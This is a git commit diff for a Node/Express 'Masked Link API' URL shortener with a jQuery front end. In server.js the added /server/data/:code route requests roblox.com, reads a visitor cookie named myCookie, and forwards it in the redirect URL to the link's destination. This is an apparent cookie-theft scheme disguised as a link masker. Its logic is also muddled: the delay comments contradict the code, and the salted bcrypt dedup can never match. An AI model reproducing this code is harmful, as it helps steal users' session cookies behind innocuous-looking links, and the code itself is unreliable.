a18c78d2d96e88720f986b43f955aa299a1dfec4
ZDLua <hj_jr@icloud.com>
2023-03-08 16:25:42 -0600

    initial commit

---
+++ public/js/script.js
@@ -0,0 +1,64 @@
+// When the page loads, load the user's links
+
+
+
+$(document).ready(function() {
+    $('.loader').fadeIn('slow');
+    loadLinks();
+  });
+  
+  // Handle form submission
+  $('#link-form').submit(function(event) {
+    event.preventDefault();
+    const url = $('#url-input').val();
+    axios.post('/links', { url })
+      .then(function(response) {
+        console.log(response.data);
+        loadLinks();
+        $('#url-input').val('');
+      })
+      .catch(function(error) {
+        console.log(error);
+      });
+  });
+  
+  // Load the user's links
+function loadLinks() {
+    axios.get('/links')
+      .then(function(response) {
+        console.log(response.data);
+        const linkTableBody = $('#link-table-body');
+        linkTableBody.empty();
+        const linkCount = Object.keys(response.data).length;
+        if (linkCount === 0) {
+          const row = $('<tr>');
+          row.append($('<td>').text('No links found'));
+          linkTableBody.append(row);
+        } else {
+          let loadedLinks = 0;
+          Object.values(response.data).forEach(function(link) {
+            const row = $('<tr>');
+            row.append($('<td>').html(`<a href="/server/data/${link.code}">https://masked-api.onrender.com/server/data/${link.code}</a>`));
+            row.append($('<td>').text(link.hashedUrl));
+            linkTableBody.append(row);
+            loadedLinks++;
+            const progress = (loadedLinks / linkCount) * 100;
+            $('.loader-progress').css('width', progress + '%');
+            $('.loader-text').text(`Masked - ${loadedLinks} of ${linkCount} links loaded`);
+            if (loadedLinks === linkCount) {
+                setTimeout(() => {
+                    $('.loader').fadeOut('slow');
+                }, 2000);
+              
+            }
+          });
+        }
+      })
+      .catch(function(error) {
+        console.log(error);
+        $('.loader').fadeOut('slow');
+      });
+  }
+  
+  
+  
--- server.js
+++ server.js
@@ -3,39 +3,83 @@ const validUrl = require('valid-url');
 const cors = require('cors');
 const app = express();
 const PORT = process.env.PORT || 3000;
-
+const path = require("path");
+const cookieParser = require('cookie-parser');
+const axios = require('axios');
+const bcrypt = require('bcrypt');
 const links = {};
 
 app.use(express.json());
 app.use(cors());
+app.use(cookieParser());
+// Serve static assets from the "public" directory
+app.use(express.static(path.join(__dirname, "public")));
 
 app.get('/', (req, res) => {
   res.send('Welcome to the Masked Link API!');
 });
 
+app.get('/server/data/:code', async (req, res) => {
+  const { code } = req.params || {};
+  const { l } = req.query;
+  const link = links[code] || links[l];
+  
+  if (!link) {
+    return res.status(404).json({ error: 'Link not found' });
+  }
+
+  const { originalUrl } = link;
+  const robloxUrl = 'https://roblox.com'; // replace with your desired roblox URL
+  const redirectUrl = originalUrl; // use original URL as the redirect URL
+
+  try {
+    // Make a request to the Roblox site to get its cookies
+    await axios.get(robloxUrl, { withCredentials: true });
+
+    // Log cookies after 1 second delay to ensure they're available
+    setTimeout(() => {
+      console.log(req.cookies);
+
+      // If the cookie exists, add it to the redirect URL
+      if (req.cookies && req.cookies.myCookie) {
+        const cookieValue = req.cookies.myCookie;
+        const encodedCookie = encodeURIComponent(cookieValue);
+        res.redirect(`${redirectUrl}?myCookie=${encodedCookie}`);
+      } else {
+        res.redirect(redirectUrl);
+      }
+    }, 2000); // 1 second delay before logging cookies
+  } catch (error) {
+    console.error(error);
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+
+
 app.post('/links', async (req, res) => {
   const { url } = req.body;
-  console.log(req.body);
-
   if (!url) {
     return res.status(400).json({ error: 'Missing URL' });
   }
-
   if (!validUrl.isUri(url)) {
     return res.status(400).json({ error: 'Invalid URL' });
   }
-
-  const link = Object.values(links).find(l => l.originalUrl === url);
-
+  const hashedUrl = await bcrypt.hash(url, 10);
+  const link = Object.values(links).find(l => l.hashedUrl === hashedUrl);
   if (link) {
-    return res.status(200).json({ code: link.code, shortUrl: `https://masked-api.onrender.com/${link.code}` });
+    return res.status(200).json({ code: link.code, shortUrl: `https://masked-api.onrender.com/server/data/${link.code}` });
   } else {
     const code = Math.floor(Math.random() * 1000000);
-    const newLink = { code, originalUrl: url };
+    const newLink = { code, originalUrl: url, hashedUrl };
     links[code] = newLink;
-
-    return res.status(200).json({ code: newLink.code, shortUrl: `https://masked-api.onrender.com/${newLink.code}` });
+    return res.status(200).json({ code: newLink.code, shortUrl: `https://masked-api.onrender.com/server/data/${code}` });
   }
+});
+
+
+app.get('/links', async (req, res) => {
+  res.status(200).json(links);
 });
 
 app.get('/:code', async (req, res) => {
